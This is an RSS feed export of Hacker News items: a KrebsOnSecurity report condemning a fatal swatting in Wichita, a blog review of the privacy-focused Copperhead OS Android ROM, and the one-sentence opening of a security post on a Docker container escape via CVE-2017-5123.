<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Call of Duty gaming community points to ‘swatting’ in Wichita police shooting</title>
<link>https://krebsonsecurity.com/2017/12/kansas-man-killed-in-swatting-attack/</link>
<guid isPermaLink="true" >https://krebsonsecurity.com/2017/12/kansas-man-killed-in-swatting-attack/</guid>
<description>&lt;p&gt;A 28-year-old Kansas man was shot and killed by police officers on the evening of Dec. 28 after someone fraudulently reported a hostage situation ongoing at his home. The false report was the latest in a dangerous hoax known as “&lt;strong&gt;swatting&lt;/strong&gt;,” wherein the perpetrator falsely reports a dangerous situation at an address with the goal of prompting authorities to respond to that address with deadly force. This particular swatting reportedly originated over &lt;a href=&quot;https://umggaming.com/m/4179723&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;a $1.50 wagered match&lt;/a&gt; in the online game &lt;strong&gt;Call of Duty&lt;/strong&gt;. Compounding the tragedy is that the man killed was an innocent party who had no part in the dispute.&lt;/p&gt;
&lt;p&gt;The following is an analysis of what is known so far about the incident, as well as a brief interview with the alleged and self-professed perpetrator of this crime.&lt;/p&gt;
&lt;p&gt;It appears that the dispute and subsequent taunting originated on Twitter. One of the parties to that dispute — allegedly using the Twitter handle “&lt;strong&gt;SWauTistic&lt;/strong&gt;” — threatened to swat another user who goes by the nickname “&lt;strong&gt;7aLeNT&lt;/strong&gt;“. @7aLeNT dared someone to swat him, but then tweeted an address that was not his own.&lt;/p&gt;
&lt;p&gt;Swautistic responded by falsely reporting to the Kansas police a domestic dispute at the address 7aLenT posted, telling the authorities that one person had already been murdered there and that several family members were being held hostage.&lt;/p&gt;
&lt;div id=&quot;attachment_42078&quot; class=&quot;wp-caption aligncenter&quot; readability=&quot;32&quot;&gt;&lt;img class=&quot;wp-image-42078 size-full&quot; src=&quot;https://krebsonsecurity.com/wp-content/uploads/2017/12/swatutistic.png&quot; alt=&quot;&quot; width=&quot;568&quot; height=&quot;910&quot; /&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;Image courtesey @mattcarries&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;A &lt;a href=&quot;http://www.kansas.com/news/local/crime/article192111974.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;story&lt;/a&gt; in the &lt;em&gt;Wichita Eagle&lt;/em&gt; says officers responded the 1000 block of McCormick and got into position, preparing for a hostage situation.&lt;/p&gt;
&lt;blockquote readability=&quot;23&quot;&gt;
&lt;p&gt;“A male came to the front door,” Livingston said. “As he came to the front door, one of our officers discharged his weapon.”&lt;/p&gt;
&lt;p&gt;“Livingston didn’t say if the man, who was 28, had a weapon when he came to the door, or what caused the officer to shoot the man. Police don’t think the man fired at officers, but the incident is still under investigation, he said. The man, who has not been identified by police, died at a local hospital.&lt;/p&gt;
&lt;p&gt;“A family member identified that man who was shot by police as Andrew Finch. One of Finch’s cousins said Finch didn’t play video games.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Not long after that, Swautistic was back on Twitter saying he could see on television that the police had fallen for his swatting attack. When it became apparent that a man had been killed as a result of the swatting, Swautistic tweeted that he didn’t get anyone killed because he didn’t pull the trigger (see image above).&lt;/p&gt;
&lt;p&gt;Swautistic soon changed his Twitter handle to &lt;strong&gt;@GoredTutor36&lt;/strong&gt;, but KrebsOnSecurity managed to obtain several weeks’ worth of tweets from Swautistic before his account was renamed. Those tweets indicate that Swautistic is a serial swatter — meaning he has claimed responsibility for a number of other recent false reports to the police.&lt;/p&gt;
&lt;p&gt;Among the recent hoaxes he’s taken credit for include a false report of a bomb threat at the &lt;strong&gt;U.S. Federal Communications Commission&lt;/strong&gt; (FCC) that &lt;a href=&quot;https://www.theverge.com/us-world/2017/12/14/16777178/fcc-net-neutrality-vote-evacuation&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;disrupted a high-profile public meeting on the net neutrality debate&lt;/a&gt;. Swautistic also has claimed responsibility for a &lt;a href=&quot;https://www.nbcdfw.com/news/local/Downtown-Dallas-Convention-Center-Evacuated-Witnesses-462882893.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hoax bomb threat that forced the evacuation of the Dallas Convention Center&lt;/a&gt;, and &lt;a href=&quot;http://www.newsherald.com/news/20171128/students-evacuated-after-arnold-high-bomb-threat-with-audio&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;another bomb threat at a high school in Panama City, Fla&lt;/a&gt;, among others.&lt;/p&gt;
&lt;p&gt;After &lt;a href=&quot;http://twitter.com/briankrebs&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;tweeting about the incident&lt;/a&gt; extensively this afternoon, KrebsOnSecurity was contacted by someone in control of the @GoredTutor36 Twitter account. GoredTutor36 said he’s been the victim of swatting attempts himself, and that this was the reason he decided to start swatting others.&lt;/p&gt;
&lt;p&gt;He said the thrill of it “comes from having to hide from police via net connections.” Asked about the FCC incident, @GoredTutor36 acknowledged it was his bomb threat. “Yep. Raped em,” he wrote.&lt;/p&gt;
&lt;p&gt;“Bomb threats are more fun and cooler than swats in my opinion and I should have just stuck to that,” he wrote. “But I began making $ doing some swat requests.”&lt;/p&gt;
&lt;p&gt;Asked whether he feels remorse about the Kansas man’s death, he responded “of course I do.”&lt;/p&gt;
&lt;p&gt;But evidently not enough to make him turn himself in.&lt;/p&gt;
&lt;p&gt;“I won’t disclose my identity until it happens on its own,” the user said in a long series of direct messages on Twitter. “People will eventually (most likely those who know me) tell me to turn myself in or something. I can’t do that; though I know its [sic] morally right. I’m too scared admittedly.”&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update, 7:15 p.m.:&lt;/strong&gt; A recording of the call to 911 operators that prompted this tragedy can be heard at &lt;a href=&quot;https://www.pscp.tv/LJSNicholeManna/1lPKqponlzQxb?t=9m10s&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;this link&lt;/a&gt;. The playback of the recorded emergency calls starts around 10 minutes into the video.&lt;/p&gt;

&lt;h4&gt;ANALYSIS&lt;/h4&gt;
&lt;p&gt;As a victim of &lt;a href=&quot;https://krebsonsecurity.com/2013/03/the-world-has-no-room-for-cowards/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;my own swatting attack back in 2013&lt;/a&gt;, I’ve been horrified to watch these crimes only increase in frequency ever since — usually with little or no repercussions for the person or persons involved in setting the schemes in motion. Given that the apparent perpetrator of this crime seems eager for media attention, it seems likely he will be apprehended soon. My guess is that he is a minor and will be treated with kid gloves as a result, although I hope I’m wrong on both counts.&lt;/p&gt;
&lt;p&gt;Let me be crystal clear on a couple of points. First off, there is no question that police officers and first responders across the country need a great deal more training to bring the number of police shootings way down. That is undoubtedly a giant contributor to the swatting epidemic.&lt;/p&gt;
&lt;p&gt;Also, all police officers and dispatchers need to be trained on what swatting is, how to spot the signs of a hoax, and how to minimize the risk of anyone getting harmed when responding to reports about hostage situations or bomb threats. Finally, officers of the peace who are sworn to protect and serve should use deadly force only in situations where there is a clear and immediate threat. Those who jump the gun need to be held accountable as well.&lt;/p&gt;
&lt;p&gt;But that kind of reform isn’t going to happen overnight. Meanwhile, knowingly and falsely making a police report that results in a SWAT unit or else heavily armed police response at an address is an invitation for someone to get badly hurt or killed. These are high-pressure situations and in most cases — as in this incident — the person opening the door has no idea what’s going on. Heaven protect everyone at the scene if the object of the swatting attack is someone who is already heavily armed and confused enough about the situation to shoot anything that comes near his door.&lt;/p&gt;
&lt;p&gt;In some states, filing a false police report is just a misdemeanor and is mainly punishable by fines. However, in other jurisdictions filing a false police report is a felony, and I’m afraid it’s long past time for these false reports about dangerous situations to become a felony offense in every state. Here’s why.&lt;/p&gt;
&lt;p&gt;If making a fraudulent report about a hostage situation or bomb threat is a felony, then if anyone dies as a result of that phony report they can legally then be charged with felony murder. Under the &lt;a href=&quot;https://www.justia.com/criminal/offenses/homicide/felony-murder/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;doctrine of felony murder&lt;/a&gt;, when an offender causes the death of another (regardless of intent) in the commission of a dangerous crime, he or she is guilty of murder.&lt;/p&gt;
&lt;p&gt;Too often, however, the perpetrators of these crimes are minors, and even when they’re caught they are frequently given a slap on the wrist. Swatting needs to stop, and unfortunately as long as there are few consequences for swatting someone, it will continue to be a potentially deadly means for gaining e-fame and for settling childish and pointless ego squabbles.&lt;/p&gt;


&lt;p class=&quot;small&quot;&gt;Tags: &lt;a href=&quot;https://krebsonsecurity.com/tag/7alent/&quot; rel=&quot;tag&quot;&gt;7alent&lt;/a&gt;, &lt;a href=&quot;https://krebsonsecurity.com/tag/swatting/&quot; rel=&quot;tag&quot;&gt;SWATting&lt;/a&gt;, &lt;a href=&quot;https://krebsonsecurity.com/tag/swautistic/&quot; rel=&quot;tag&quot;&gt;swautistic&lt;/a&gt;&lt;/p&gt;
&lt;p class=&quot;postmetadata alt&quot;&gt;&lt;small&gt;This entry was posted on Friday, December 29th, 2017 at 4:17 pm and is filed under &lt;a href=&quot;https://krebsonsecurity.com/category/neer-do-well-news/&quot; rel=&quot;category tag&quot;&gt;Ne'er-Do-Well News&lt;/a&gt;, &lt;a href=&quot;https://krebsonsecurity.com/category/comingstorm/&quot; rel=&quot;category tag&quot;&gt;The Coming Storm&lt;/a&gt;. You can follow any comments to this entry through the &lt;a href=&quot;https://krebsonsecurity.com/2017/12/kansas-man-killed-in-swatting-attack/feed/&quot;&gt;RSS 2.0&lt;/a&gt; feed. You can skip to the end and leave a comment. Pinging is currently not allowed.&lt;/small&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 29 Dec 2017 18:08:39 +0000</pubDate>
<dc:creator>pjc50</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://krebsonsecurity.com/2017/12/kansas-man-killed-in-swatting-attack/</dc:identifier>
</item>
<item>
<title>Review: Copperhead OS</title>
<link>https://www.adventuresinoss.com/2017/01/18/review-copperhead-os/</link>
<guid isPermaLink="true" >https://www.adventuresinoss.com/2017/01/18/review-copperhead-os/</guid>
<description>&lt;p&gt;A few weeks ago I found an article in my news feed about a &lt;a href=&quot;http://arstechnica.com/security/2016/11/tor-phone-prototype-google-hostility-android-open-source/&quot;&gt;Tor phone&lt;/a&gt;, and it introduced me to &lt;a href=&quot;https://copperhead.co/android/&quot;&gt;Copperhead OS&lt;/a&gt;. This is an extremely hardened version of the &lt;a href=&quot;https://source.android.com/&quot;&gt;Android Open Source Project&lt;/a&gt; (AOSP) designed for both security and privacy. It has become my default mobile OS so I thought I’d write about my experiences with it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;TL;DR:&lt;/strong&gt; Copperhead OS is not for everyone. Due to its focus on security is it not easy to install any software that relies on Google Services, which is quite a bit. But if you are concerned with security and privacy, it offers a very stable and up to date operating system. The downside is that I am not able to totally divorce myself from Google, so I’ve taken to carrying two phones: one with Copperhead and one with stock Android for my “Googly” things. What we really need is a way to run a hypervisor on mobile device hardware. That way I could put all of my personal stuff on a Copperhead and the stuff I want to share with Google in a VM.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I pride myself to the point of being somewhat smug about the fact that I use free software for most of my technology needs, or so I thought. My desktops, laptop, servers, router, DVR and even my weather station all use free and open source software, and I run &lt;a href=&quot;https://omnirom.org/&quot;&gt;OmniROM&lt;/a&gt; (an AOSP implementation) on my phone. I also “sandbox” my Google stuff – I only use Chrome for accessing Google web apps and I keep everything else separate (no sharing of my contacts and calendar, for example). So, I was unpleasantly surprised at how much I relied on proprietary software for my handy (short for “hand terminal” or what most people call a “mobile phone”, but I rarely use the “phone” features of it so it seems like a misnomer).&lt;/p&gt;
&lt;p&gt;But first a little back story. I was sitting on the toilet playing on my mobile device (“playing on my handy” seemed a little rude here) when I came across a page that showed me all of the stuff Google was tracking about my mobile usage. It was a lot, and let’s just say any bathroom issues I was having were promptly solved. They were tracking every call and text I made, which apps I opened, as well as my location. I knew about the last one since I do play games like &lt;a href=&quot;https://www.adventuresinoss.com/2013/05/01/review-ingress-by-nianticlabsgoogle/&quot;&gt;Ingress&lt;/a&gt; and &lt;a href=&quot;http://tarus.io/?p=861&quot;&gt;Pokémon Go&lt;/a&gt; that track you, but the others surprised me. I was able to turn those off (supposedly) but it was still a bit shocking.&lt;/p&gt;
&lt;p&gt;Of course, I had “opted in” to all of that when I signed in to my handy for the first time. When you allow Google to backup your device data, you allow them to record your passwords and call history.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.adventuresinoss.com/wp-content/uploads/sites/2/2017/01/google-backup.png&quot; alt=&quot;Google Backup Terms&quot;/&gt;&lt;/p&gt;
&lt;p&gt;If you opt in to help “improve your Android experience”, you allow them to track your app usage.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.adventuresinoss.com/wp-content/uploads/sites/2/2017/01/google-apps.png&quot; alt=&quot;Google App Terms&quot;/&gt;&lt;/p&gt;
&lt;p&gt;And most importantly, by using your Google account you allow them to install software automatically (i.e. without your explicit permission).&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.adventuresinoss.com/wp-content/uploads/sites/2/2017/01/google-update.png&quot; alt=&quot;Google Upgrade Terms&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Note that this was on a phone running OmniROM, and not stock Google, but it still looks like you have to give Google a lot of control over your handy if you want to use a Google account.&lt;/p&gt;
&lt;p&gt;Copperhead OS is &lt;a href=&quot;https://copperhead.co/android/docs/technical_overview&quot;&gt;extremely focused on security&lt;/a&gt;, which implies the ability to audit as much software on the device as possible, as well as to control when and what gets updated. This lead them to remove Google Play Services from the ROM entirely. Instead, they set up &lt;a href=&quot;https://f-droid.org/&quot;&gt;F-Droid&lt;/a&gt; as the trusted repository. All the software in F-Droid is open source, and in fact all of the binaries are built by the F-Droid team and not the developer. Now, of course, someone on that team could be compromised and put malicious software into the repo, but you’ve got to trust somebody or you will spend your entire life doing code reviews and compiling.&lt;/p&gt;
&lt;p&gt;Copperhead only runs on a &lt;a href=&quot;https://copperhead.co/android/downloads&quot;&gt;small subset of devices&lt;/a&gt;: the Nexus 6P, the Nexus 5X and the Nexus 9 WiFi edition. This is because they support secure boot which prevents malicious code from modifying the operating system. Now, I happened to have a 6P, so I figured I would try it out.&lt;/p&gt;
&lt;p&gt;The first hurdle was understanding their terminology. On the &lt;a href=&quot;https://copperhead.co/android/downloads&quot;&gt;download page&lt;/a&gt; they refer to a “factory” image, which I initially took to mean the original stock image from Google. What they mean is an image that you can use for a base install. If you flash your handy as often as I do, you have probably come across the process for &lt;a href=&quot;https://developers.google.com/android/images&quot;&gt;restoring it to stock&lt;/a&gt;. You install the &lt;a href=&quot;https://developer.android.com/studio/index.html&quot;&gt;Android SDK&lt;/a&gt; and then download a “factory” image from Google. You then expand it (after checking the hash, of course) and run a “flash-all” script. This will replace all the data on your device, including a custom recovery like &lt;a href=&quot;https://twrp.me/&quot;&gt;TWRP&lt;/a&gt;, and you’ll be ready to run Copperhead. Note that I left off some steps such as unlocking and then re-locking the bootloader, but &lt;a href=&quot;https://copperhead.co/android/docs/install&quot;&gt;their instructions&lt;/a&gt; are easy to follow.&lt;/p&gt;
&lt;p&gt;The first thing you notice is that there isn’t the usual “set up your Google account” steps, because, of course, you can’t use your Google account on Copperhead. Outside of missing Google Apps, the device has a very stock Android feel, including the immovable search bar and the default desktop background.&lt;/p&gt;
&lt;p&gt;This is when reality began to set in as I started to realize exactly how much proprietary software I used to make my handy useful.&lt;/p&gt;
&lt;p&gt;The first app I needed to install was the &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.teslacoilsw.launcher&quot;&gt;Nova Launcher&lt;/a&gt;. This is a great Launcher replacement that gives you a tremendous amount of control over the desktop. I looked around F-Droid for replacement launchers, and they either didn’t do what I wanted them to do, or they haven’t been updated in a couple of years.&lt;/p&gt;
&lt;p&gt;Then it dawned on me – why don’t I just copy over the apk?&lt;/p&gt;
&lt;p&gt;When you install a package from Google Play, it usually gets copied into the /data/apps directory. Using the &lt;code&gt;adb shell&lt;/code&gt; and the &lt;code&gt;adb pull&lt;/code&gt; commands from the SDK, I was able to grab the Nova Launcher software off of my Nexus 6 (which was running OmniROM) and copy it over to the 6P. Using the very awesome &lt;a href=&quot;https://f-droid.org/repository/browse/?fdfilter=amaze&amp;amp;fdid=com.amaze.filemanager&quot;&gt;Amaze&lt;/a&gt; file explorer, you just navigate to the apk and open it. Now, of course, since this file didn’t come from a trusted repository you have to go under Security and turn off the “trusted sources” option (and be sure to turn it back on when you are done). I was very happy to see that it runs just fine without Google Services, and I was able to get rid of the search bar and make other tweaks.&lt;/p&gt;
&lt;p&gt;Then I focused on installing the open source apps I do use, such as &lt;a href=&quot;https://f-droid.org/repository/browse/?fdfilter=k-9&amp;amp;fdid=com.fsck.k9&quot;&gt;K-9 Mail&lt;/a&gt; and &lt;a href=&quot;https://f-droid.org/repository/browse/?fdfilter=wikipedia&amp;amp;fdid=org.wikipedia&amp;amp;fdpage=2&quot;&gt;Wikipedia&lt;/a&gt;, both of which exist in F-Droid. I had been using the &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.mxtech.videoplayer.ad&quot;&gt;MX Player&lt;/a&gt; app for watching videos, pretty much out of habit, but it was easy to replace with the &lt;a href=&quot;https://f-droid.org/repository/browse/?fdfilter=vlc&amp;amp;fdid=org.videolan.vlc&quot;&gt;VLC&lt;/a&gt; app from F-Droid.&lt;/p&gt;
&lt;p&gt;I really like the &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.maxmpz.audioplayer&amp;amp;hl=en&quot;&gt;Poweramp&lt;/a&gt; music player, with the exception that it periodically checks in with the Play store to make sure your license is valid. Unfortunately, this has happened to me twice when I was in an airplane over the ocean, and the lack of network access meant I couldn’t listen to music. I was eager to replace it, but the default Music app that ships with Copperhead is kind of lame. It does a good job playing music, but the interface is hard to navigate. The “black on gray” color scheme is very hard to read.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.adventuresinoss.com/wp-content/uploads/sites/2/2017/01/music-screen.png&quot; alt=&quot;Default Music Player Screenshot&quot;/&gt;&lt;/p&gt;
&lt;p&gt;So I replaced it with the entirely capable &lt;a href=&quot;https://f-droid.org/repository/browse/?fdfilter=timber&amp;amp;fdid=naman14.timber&quot;&gt;Timber&lt;/a&gt; app from F-Droid.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.adventuresinoss.com/wp-content/uploads/sites/2/2017/01/timber-screen.png&quot; alt=&quot;Timber Music Player Screenshot&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Another thing I needed to replace was &lt;a href=&quot;https://www.feedly.com&quot;&gt;Feedly&lt;/a&gt;. I’m old, so I still get most of my news directly from websites via RSS feeds and not social media. I used to use Google Reader, and when that went away I switched to Feedly. It worked fine, but I bristled at the fact that it tracked my reading habits. Next to each article would be a number representing the number of people who clicked on it to read it, so at a minimum they were tracking that. I investigated a couple of open source replacements when I was pleasantly surprised to discover that &lt;a href=&quot;https://nextcloud.com/&quot;&gt;Nextcloud&lt;/a&gt; has a built in &lt;a href=&quot;https://github.com/nextcloud/news&quot;&gt;News&lt;/a&gt; service. We have had a really good experience with Nextcloud over the last couple of months, and it was pretty easy to add the news service to our instance. Using &lt;a href=&quot;https://en.wikipedia.org/wiki/OPML&quot;&gt;OPML&lt;/a&gt; I was able to export my numerous feeds from Feedly into Nextcloud, and that was probably the easiest part of this transition. On the handy I used an F-Droid app called &lt;a href=&quot;https://f-droid.org/repository/browse/?fdfilter=ocreader&amp;amp;fdid=email.schaal.ocreader&quot;&gt;OCReader&lt;/a&gt; which works well.&lt;/p&gt;
&lt;p&gt;There were still some things I was missing. For example, when I travel overseas I keep in touch with my bride using Skype (which is way cheaper than using the phone) so I wanted to have Skype on this device. It turns out that it is in the &lt;a href=&quot;https://www.amazon.com/mobile-apps/b?ie=UTF8&amp;amp;node=2350149011&quot;&gt;Amazon App Store&lt;/a&gt;, so I installed that and was able to get things like Skype and the eBay and IMDB apps (as well as &lt;a href=&quot;http://amzn.to/2iKe9i1&quot;&gt;Bridge Baron&lt;/a&gt;, which I like a lot). Note that you still have to allow unknown sources since the Amazon repository is not trusted, and remember to set it back when you are done.&lt;/p&gt;
&lt;p&gt;This still left a handful of apps I wanted, and based on my success with the Nova Launcher I just tried to install them from apks. Surprisingly, most of them worked, although a couple would complain about Google Services being missing. I think background notifications is the main reason they use Google Services, so if you can live without that you can get by just fine.&lt;/p&gt;
&lt;p&gt;One app that wouldn’t work was &lt;a href=&quot;https://play.google.com/store/apps/details?id=org.thoughtcrime.securesms&amp;amp;hl=en&quot;&gt;Signal&lt;/a&gt;, which was very surprising since they seem to be focused on privacy and security. Instead, the default messenger is an app called &lt;a href=&quot;https://silence.im/&quot;&gt;Silence&lt;/a&gt;, which is a Signal fork. It works well, but it isn’t in the Play store (at least in the US due to a silly trademark issue that hasn’t been fixed) and no one I know uses it so it kind of defeats the purpose of secure messaging. Luckily, I discovered that the Copperhead gang has published their own fork called &lt;a href=&quot;https://github.com/copperhead/Noise&quot;&gt;Noise&lt;/a&gt;, which removes the Googly bits but still works with the rest of the Signal infrastructure, so I have been using it as my default client with no issues. Note that it is in the F-Droid app but doesn’t show up on the F-Droid website for some reason.&lt;/p&gt;
&lt;p&gt;For other apps such as Google+ and Yelp, I rediscovered the world wide web. Yes, browsers still work, and the web pages for these sites are pretty close to matching the functionality of the native app.&lt;/p&gt;
&lt;p&gt;There are still some things for which there is no open source replacement: &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.google.android.apps.maps&amp;amp;hl=en&quot;&gt;Google Maps&lt;/a&gt;, for example. Yes, I know, by using Google Maps I am sharing my location with Google, but the traffic data is just so good that it has saved literally hours of my life by directing me around accidents and other traffic jams. &lt;a href=&quot;https://f-droid.org/repository/browse/?fdfilter=osm&amp;amp;fdid=net.osmand.plus&quot;&gt;OpenStreetMap&lt;/a&gt; is okay and works great offline, but it doesn’t know where the &lt;a href=&quot;https://www.opennms.com/contact/&quot;&gt;OpenNMS&lt;/a&gt; office is located (I need to fix that) and without traffic it is a lot less useful. There is also the fact that I do like to play games like &lt;em&gt;Ingress&lt;/em&gt; and &lt;em&gt;Pokémon Go&lt;/em&gt;, and I have some movies and other content on Google servers.&lt;/p&gt;
&lt;p&gt;I also lost &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.google.android.wearable.app&amp;amp;hl=en&quot;&gt;Android Wear&lt;/a&gt;. I really enjoy my &lt;a href=&quot;https://www.adventuresinoss.com/2015/06/25/review-lg-watch-urbane/&quot;&gt;LG Urbane&lt;/a&gt; but it won’t work without Google Services. I have been playing with &lt;a href=&quot;https://asteroidos.org/&quot;&gt;AsteroidOS&lt;/a&gt; which shows a lot of promise, but it isn’t quite there yet.&lt;/p&gt;
&lt;p&gt;Note that &lt;a href=&quot;https://compass.opennms.io/&quot;&gt;Compass by OpenNMS&lt;/a&gt; is not yet available in F-Droid. We use &lt;a href=&quot;https://cordova.apache.org/&quot;&gt;Apache Cordova&lt;/a&gt; to build it and that is not (yet) supported by the F-Droid team. We do post the &lt;a href=&quot;https://github.com/OpenNMS/opennms-compass/releases&quot;&gt;apks on Github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To deal with my desire for privacy and my desire to use some Google software, I decided to carry two phones.&lt;/p&gt;
&lt;p&gt;On the Nexus 6P I run Copperhead and it has all of my personal stuff on it: calendar, contacts, e-mail, etc. On the Nexus 6 I am running stock Google with all my Googly bits, including maps. I still lock down what I share with Google, but I feel a lot more confident that I won’t accidentally sync the rest of my life with them.&lt;/p&gt;
&lt;p&gt;It sucks carrying two phones. With the processors and memory in modern devices I’m surprised that no one has come up with a hypervisor technology that would let me run Copperhead as my base OS and stock Google in a VM. Well, not really surprised since there isn’t a commercial motivation for it. Apple doesn’t have a reason to let other software on its products, and Google would be shooting itself in the foot since its business model involves collecting data on everything. I do think it will happen, however. The use case involves corporations, especially those involved in privacy sensitive fields such as health care. Wouldn’t it be cool to have a locked down “business” VM that is separate from a “personal” VM with your Facebook, games and private stuff on it.&lt;/p&gt;
&lt;p&gt;As for the Copperhead experience itself, it is pretty solid. I had a couple of issues where DNS would stop working, but those seem to have been resolved, and lately it has been rock solid except for one instance when I lost cellular data. I tried reseting the APN but that didn’t help, but after a reboot it started working again. Odd. Overall is it probably the most stable ROM I’ve run, but part of that could be due to how vanilla it is.&lt;/p&gt;
&lt;p&gt;Copperhead is mainly concerned with security and not extending the Android experience. For example, one feature I love about the OmniROM version of the Alarm app is the ability to set an action on “shake”. For example, I set it to “shake to dismiss” so when my alarm goes off I can just reach over, shake the phone, and go back to bed. That is missing from the stock ROM (but included in AOSP) and thus it is missing from Copperhead. The upside is that Copperhead is extremely fast with updates, especially security updates.&lt;/p&gt;
&lt;p&gt;The biggest shortcoming is the keyboard. I’ve grown used to “gesture” typing using the Google keyboard, but that is missing from the AOSP keyboard and no free third party keyboards have it either. &lt;a href=&quot;https://github.com/copperhead/bugtracker/issues/532&quot;&gt;I asked&lt;/a&gt; the Copperhead guys about it and got this reply:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If the open-source community makes a better keyboard than AOSP Keyboard, we’ll switch to it. Right now it’s still the best option. There’s no choice available with gesture typing, let alone parity with the usability of the built-in keyboard. Copperhead isn’t going to be developing a keyboard. It’s totally out of scope for the project.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, not a show stopper, but if anyone is looking to make a name for themselves in the AOSP world, a new keyboard would be welcome.&lt;/p&gt;
&lt;p&gt;To further increase security, there is a suggestion to create a &lt;a href=&quot;https://github.com/copperhead/bugtracker/issues/451&quot;&gt;strong two-factor authentication&lt;/a&gt; mechanism. The 6P has a fingerprint sensor, but I don’t use it because I don’t believe that your fingerprint is a good way to secure your device (it is pretty easy to coerce you to unlock your handy if all someone has to do is hold you down and force your finger on to a sensor). However, having a fingerprint &lt;em&gt;and&lt;/em&gt; a PIN would be really secure, as the best security is combining something you have (a fingerprint) with something you know (a PIN).&lt;/p&gt;
&lt;p&gt;So here was my desktop on OmniROM:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.adventuresinoss.com/wp-content/uploads/sites/2/2017/01/olddesktop.png&quot; alt=&quot;Old Phone Desktop&quot;/&gt;&lt;/p&gt;
&lt;p&gt;and here is my current desktop:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.adventuresinoss.com/wp-content/uploads/sites/2/2017/01/newdesktop.png&quot; alt=&quot;New Phone Desktop&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Not much different, and while I’ve given up a few things I’ve also discovered OCReader and Nextcloud News, plus the Amaze file manager.&lt;/p&gt;
&lt;p&gt;But the biggest thing I’ve gained is peace of mind. I want to point out that it is possible to run other ROMs, such as OmniROM, without Google Services, but they aren’t quite as focused on security as Copperhead. Many thanks to the Copperhead team for doing this, and if you don’t want to go through all the work I did, you can &lt;a href=&quot;https://copperhead.co/android/buy&quot;&gt;buy a supported device&lt;/a&gt; directly from them.&lt;/p&gt;
</description>
<pubDate>Fri, 29 Dec 2017 16:58:39 +0000</pubDate>
<dc:creator>billpollock</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.adventuresinoss.com/2017/01/18/review-copperhead-os/</dc:identifier>
</item>
<item>
<title>Escaping Docker container using waitid() – CVE-2017-5123</title>
<link>https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/</link>
<guid isPermaLink="true" >https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/</guid>
<description>&lt;div class=&quot;post-author-info&quot;&gt;

&lt;p&gt;Dec 27, 2017&lt;/p&gt;
&lt;div class=&quot;post-author-name&quot;&gt;by &lt;a href=&quot;https://www.twistlock.com/author/daniel-shapira/&quot; title=&quot;Posts by Daniel Shapira&quot; class=&quot;author url fn&quot; rel=&quot;author&quot;&gt;Daniel Shapira&lt;/a&gt;&lt;/div&gt;
&lt;span class=&quot;social-share&quot;&gt;share:&lt;/span&gt;

&lt;/div&gt;&lt;p&gt;This post describes how I exploited the &lt;code&gt;waitid()&lt;/code&gt; vulnerability in order to modify the &lt;a href=&quot;https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt&quot;&gt;Linux capabilities&lt;/a&gt; of a Docker container to gain elevated privileges, and ultimately escape the container jail.&lt;/p&gt;
